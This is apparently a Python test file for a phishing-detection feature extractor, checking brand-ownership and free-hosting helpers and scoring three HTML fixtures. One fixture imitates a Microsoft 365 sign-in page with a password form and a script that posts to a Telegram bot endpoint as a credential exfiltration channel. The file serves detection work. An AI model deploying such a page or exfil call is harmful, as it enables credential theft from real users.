"""Offline tests for the URL baseline, TBDF baseline, Layer 5 and CSBI-PA."""
import datetime as dt

from common.brand_match import brand_owns_host, brands_in_host_label, brands_in_text
from common.hosting import is_free_hosted, registrable_domain, tenant_label
from module3_behavioral.extraction.extractor import extract_features
from module3_behavioral.extraction.fetch import FetchResult

PHISH_HTML = """<html><head><title>Microsoft Office 365 - Sign in</title></head><body>
<img src="data:image/png;base64,AAAA" alt="Microsoft logo">
<h1>Sign in to your account</h1>
<form id="f" action="#"><input type="email" name="login" placeholder="Email">
<input type="password" name="passwd"><button>Next</button></form>
<script>fetch("https://api.telegram.org/bot123:abc/sendMessage",{method:"POST"})</script>
</body></html>"""

DOCS_HTML = """<html><head><title>fastlib documentation</title></head><body>
<h1>fastlib</h1><p>A small library. Install with pip. """ + "Docs text. " * 30 + """</p>
<a href="/guide/">Guide</a><a href="/api/">API</a><a href="https://github.com/x/fastlib">Source</a>
</body></html>"""

BANK_HTML = """<html><head><title>HDFC Bank NetBanking</title></head><body>
<img src="/img/logo.png" alt="HDFC Bank logo"><h1>HDFC Bank</h1>
<form action="/netbanking/login"><input name="userid"><input type="password" name="pwd"></form>
<a href="/a">a</a><a href="/b">b</a></body></html>"""


def _fetch(html, host, cert=None, cookies=None, age_days=4000):
    now = dt.datetime.now(dt.timezone.utc).replace(tzinfo=None)

    def f(url, save=True):
        return FetchResult(url=url, final_url=url, status_code=200, ok=True, html=html,
                           resolved_ip="104.16.0.1", ssl_issuer="Google Trust Services",
                           ssl_not_before=now - dt.timedelta(days=60),
                           whois_creation=now - dt.timedelta(days=age_days),
                           whois_expiration=now + dt.timedelta(days=365),
                           cert_names=cert or [], cookie_domains=cookies or [],
                           redirect_hosts=[host])
    return f


def _scan(url, html, host, **kw):
    import module3_behavioral.extraction.extractor as ex
    ex.lookup_asn = lambda ip: ("AS13335", "Cloudflare")
    return extract_features(url, fetch_fn=_fetch(html, host, **kw), save_snapshot=False)


def test_hosting_helpers():
    assert is_free_hosted("https://login-ms365.pages.dev/")
    assert not is_free_hosted("https://www.hdfcbank.com/")
    assert registrable_domain("a.b.pages.dev") == "b.pages.dev"
    assert tenant_label("sbi-kyc.pages.dev") == "sbi-kyc"


def test_brand_ownership():
    assert brand_owns_host("hdfc", "netbanking.hdfcbank.com")
    assert not brand_owns_host("paypal", "paypal-verify.pages.dev")
    assert "paypal" in brands_in_host_label("paypal-verify.pages.dev")
    assert brands_in_text("Sign in to Microsoft Outlook")[0] == "microsoft"
    assert "ups" not in brands_in_host_label("groupsite.com")   # short alias needs a token


def test_free_hosted_phish_is_caught_by_layer5_not_tbdf():
    r = _scan("https://office-docs-share.pages.dev/", PHISH_HTML, "office-docs-share.pages.dev",
              cert=["*.pages.dev", "pages.dev"])
    f = r.features
    assert f["free_hosted"] == 1
    assert f["tbdf_cn_info"] == 1               # wildcard cert "matches": borrowed
    assert f["p5_brand_impersonation"] == 1
    assert f["p5_exfil_endpoint"] == 1
    assert f["p5_static_cred_form"] == 1
    assert f["borrowed_credibility"] > 0.3
    assert f["CSBI_PA"] > 40


def test_legit_free_hosted_docs_stays_low():
    r = _scan("https://fastlib.github.io/", DOCS_HTML, "fastlib.github.io",
              cert=["*.github.io", "github.io"])
    f = r.features
    assert f["p5_cred_form"] == 0 and f["p5_exfil_endpoint"] == 0
    assert f["p5_brand_impersonation"] == 0
    assert f["CSBI_PA"] < 40


def test_legit_bank_not_impersonation():
    r = _scan("https://netbanking.hdfcbank.com/", BANK_HTML, "netbanking.hdfcbank.com",
              cert=["netbanking.hdfcbank.com"], cookies=["netbanking.hdfcbank.com"])
    f = r.features
    assert f["p5_brand_impersonation"] == 0
    assert f["borrowed_credibility"] == 0
    assert f["tbdf_form_domain"] == 1 and f["tbdf_logo_domain"] == 1 and f["tbdf_cookie_domain"] == 1
    assert f["url_https"] == 1
